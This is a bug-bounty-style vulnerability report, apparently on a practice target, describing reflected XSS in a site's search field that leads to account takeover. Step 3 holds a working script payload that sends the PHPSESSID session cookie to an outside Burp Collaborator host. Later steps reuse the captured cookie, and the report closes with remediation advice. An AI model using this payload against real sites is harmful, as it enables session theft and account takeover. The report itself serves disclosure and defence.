## Title
Reflected XSS to Account Takeover
<!-- Write a short, clear title describing the vulnerability and where it was found. Example: Stored XSS in User Profile -->

## Description
**Affected URL:** https://pixeleet.pwnedbox.site/
<!-- Explain what the vulnerability is, where it exists, and why it is a security issue. Include the affected URL or endpoint. -->
The search functionality is vulnerable to reflected cross-site scripting (XSS). A payload entered into the search field executes JavaScript in the context of the application.The proof of concept shows that the session cookie, `PHPSESSID`, does not have the `HttpOnly` flag and is accessible through `document.cookie`. The payload sends the cookie to Burp Collaborator, where it can be captured and reused in another browser.
## Steps to Reproduce
<!-- Provide clear, numbered steps so another person can reproduce the issue. Include required requests, parameters, and actions. -->
1. Visit https://pixeleet.pwnedbox.site/ and click **Join**.
2. Create a test account and sign in.
3. Enter the following payload in the search field and submit it:
   ```html
   '"><script>document.write(`<img src=https://zy1p23olh9sqv6wrdmcc8x1zjqphd71w.oastify.com/${document.cookie}>`)</script>
   ```
4. In Burp Collaborator, observe the HTTP interaction containing `PHPSESSID` in the request path.
5. In a separate browser, set the `PHPSESSID` cookie for `pixeleet.pwnedbox.site` to the captured value.
6. Refresh the page and observe that the test account is accessible without signing in.
## POC (Proof of Concept)
<!-- Add screenshots, HTTP requests/responses, payloads, or videos that demonstrate the vulnerability. -->
1. The first screenshot shows the homepage and the **Join** button.

<img width="1920" height="969" alt="1" src="https://github.com/user-attachments/assets/13286463-3940-46fd-b9f0-4bd75723dd4f" />

2. The second screenshot shows the test account registration form.

<img width="1920" height="968" alt="2" src="https://github.com/user-attachments/assets/2a961c7e-75d4-48f8-ac74-8cf9ab0af365" />

3. The third screenshot shows the payload in the search field while signed in to the test account.

<img width="1920" height="966" alt="3" src="https://github.com/user-attachments/assets/b05778a8-685d-4be6-9bab-b92a66d25f1a" />

4. The fourth screenshot shows Burp Collaborator receiving a request containing the session cookie.

<img width="1920" height="1020" alt="4" src="https://github.com/user-attachments/assets/33b44aec-6916-4213-a395-95e6bab349eb" />

5. The fifth screenshot shows the captured cookie set in a separate browser before refreshing.

<img width="1920" height="971" alt="5" src="https://github.com/user-attachments/assets/35747663-681f-4206-998b-6e858090973c" />

6. The sixth screenshot shows access to the test account after the cookie was reused.

<img width="1920" height="964" alt="6" src="https://github.com/user-attachments/assets/b3d1179e-494c-4b18-8029-91be25e4e626" />

## Impact
<!-- Explain what an attacker could achieve, who could be affected, and the realistic security consequences. -->
An attacker who can cause a victim to execute the payload could capture the victim's JavaScript-accessible session cookie and reuse it to access the victim's account. The proof of concept demonstrates account access through session reuse.
## Remediation
<!-- Suggest specific steps to fix the vulnerability. Include secure coding practices or configuration changes where appropriate. -->
1. Apply context-appropriate output encoding to search input before rendering it.
2. Avoid inserting untrusted input into HTML using unsafe APIs such as `document.write`.
3. Set session cookies with `HttpOnly`, `Secure`, and an appropriate `SameSite` attribute.
4. Implement a restrictive Content Security Policy as defense in depth.
5. Invalidate exposed sessions and rotate session identifiers.
